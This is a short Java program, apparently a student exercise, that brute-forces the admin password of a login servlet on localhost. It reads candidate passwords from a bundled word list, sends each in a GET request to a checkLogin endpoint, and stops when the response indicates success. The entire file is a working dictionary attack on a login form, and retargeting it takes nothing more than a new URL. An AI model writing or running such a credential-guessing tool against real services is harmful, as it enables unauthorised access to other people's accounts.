package com.breaking;

import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;

/**
 * 暴力破解密码,从密码库中 穷举
 * @author likang
 *
 */
public class Pj2 {

	public static void main(String[] args)throws Exception
	{
		//把密码文件读写到List集合中
		InputStream is=Pj2.class.getResourceAsStream("/com/pj/hello.txt");
		List<String> pwds=IOUtils.readLines(is, "utf-8");
		
		for(String str:pwds)
		{
			URL url=new URL("http://localhost/servlet24/checkLogin?uname=admin&upwd="+str);
			URLConnection uc=url.openConnection();
			InputStream iss=uc.getInputStream();
			List<String> res=IOUtils.readLines(iss,"UTF-8");
			
			StringBuilder sb=new StringBuilder();
			for(String s:res)
				sb.append(s);
			if(sb.toString().indexOf("user")!=-1)
			{
				System.out.println(str+"---不对");
			}else
			{
				System.out.println(str+"---对");
				break;
			}
		}
		is.close();
		

	}

}
